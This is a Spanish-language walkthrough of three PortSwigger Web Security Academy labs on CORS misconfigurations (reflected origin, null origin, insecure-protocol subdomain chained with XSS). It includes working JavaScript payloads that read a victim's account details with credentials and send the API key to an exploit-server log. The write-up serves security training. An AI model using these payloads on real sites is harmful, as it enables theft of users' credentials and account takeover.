# Cross-origin resource sharing (CORS)

## Lab: CORS vulnerability with basic origin reflection

### Enunciado

Este sitio web tiene una configuración CORS insegura, ya que confía en todos los orígenes. Crea un código JavaScript que use CORS para obtener la clave API del administrador y súbelo a tu servidor de exploits. El laboratorio se considera resuelto cuando logres enviar con éxito la clave API del administrador.

Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos. Vemos la petición de los detalles del usuario.

<figure><img src="../../.gitbook/assets/image (1514).png" alt=""><figcaption></figcaption></figure>

Vemos que se encuentra la cabecera **Access-Control-Allow-Credentials** que es vulnerable a CORS. Añadimos la cabecera **Origin**.

<figure><img src="../../.gitbook/assets/image (1515).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto realizamos este script para enviarlo a la víctima.

```
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://0a6b006e0413a15d83e2e31b00e70026.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
      location='/log?key='+this.responseText;
  };
</script>

```

Viendo los logs vemos que una petición al enviarle a la víctima que decodificamos.

<figure><img src="../../.gitbook/assets/image (1516).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1517).png" alt=""><figcaption></figcaption></figure>

Hemos encontrado la API.

<figure><img src="../../.gitbook/assets/image (1518).png" alt=""><figcaption></figcaption></figure>

## Lab: CORS vulnerability with trusted null origin

### Enunciado

Este sitio web tiene una configuración CORS insegura, ya que confía en el origen "null". Crea un código JavaScript que use CORS para obtener la clave API del administrador y súbelo a tu servidor de exploits. El laboratorio se considera resuelto cuando logres enviar con éxito la clave API del administrador.

Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos. Vemos la petición de los detalles del usuario.

<figure><img src="../../.gitbook/assets/image (1519).png" alt=""><figcaption></figcaption></figure>

Vemos que se encuentra la cabecera **Access-Control-Allow-Credentials** que es vulnerable a CORS. Añadimos la cabecera **Origin**.

<figure><img src="../../.gitbook/assets/image (1520).png" alt=""><figcaption></figcaption></figure>

Vemos que no está permitido el acceso desde **test.com**. Tras esto lo cambiamos a **null** el **Origin**.

<figure><img src="../../.gitbook/assets/image (1521).png" alt=""><figcaption></figcaption></figure>

Vemos que ahora sí que hay acceso a nulos. Sabiendo esto realizamos el script.

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://0a47008e03322d42809f12540004005c.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
      location='https://exploit-0afe000e03de2d7f80ef1117010800cb.exploit-server.net/exploit/log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

Viendo los logs vemos que una petición al enviarle a la víctima que decodificamos.

<figure><img src="../../.gitbook/assets/image (1522).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1523).png" alt=""><figcaption></figcaption></figure>

## Lab: CORS vulnerability with trusted insecure protocols

### Enunciado

Este sitio web tiene una configuración CORS insegura que confía en todos los subdominios sin importar el protocolo. Crea un código JavaScript que aproveche CORS para obtener la clave API del administrador y súbelo a tu servidor de explotación. El laboratorio se considerará resuelto cuando envíes correctamente la clave API del administrador.

Puedes iniciar sesión en tu propia cuenta con las siguientes credenciales:

* **Usuario:** `wiener`
* **Contraseña:** `peter`

### Resolución

Nos logueamos y vemos la siguiente petición como en los anteriores laboratorios.

<figure><img src="../../.gitbook/assets/image (1561).png" alt=""><figcaption></figcaption></figure>

Ponemos un **Origin** aleatorio.

<figure><img src="../../.gitbook/assets/image (1562).png" alt=""><figcaption></figcaption></figure>

El encabezado de respuesta no refleja nuestro host en **Origin**. En el enunciado nos dice que este sitio web tiene una configuración CORS insegura, ya que confía en todos los subdominios sin importar el protocolo. Esto significa que el sitio tiene en su lista blanca un subdominio de confianza que usa HTTP sin cifrar.

<figure><img src="../../.gitbook/assets/image (1563).png" alt=""><figcaption></figcaption></figure>

Cuando hago clic en el botón **"Check stock"**, se abrió **otra ventana** que apunta a:

```
https://stock.0afb00e904f995b4802b03f200f60064.web-security-academy.net/?productId=1&storeId=1
```

Este es un **subdominio** de `0afb00e904f995b4802b03f200f60064.web-security-academy.net`. Además, **el parámetro `productId` es vulnerable a XSS.**

<figure><img src="../../.gitbook/assets/image (1564).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto realizamos el siguiente script enviándoselo a la víctima.

```
<script>
    document.location="http://stock.0afb00e904f995b4802b03f200f60064.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0afb00e904f995b4802b03f200f60064.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0aaa0009045f95fa805e02c9011c00c9.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

<figure><img src="../../.gitbook/assets/image (1565).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1566).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1567).png" alt=""><figcaption></figcaption></figure>
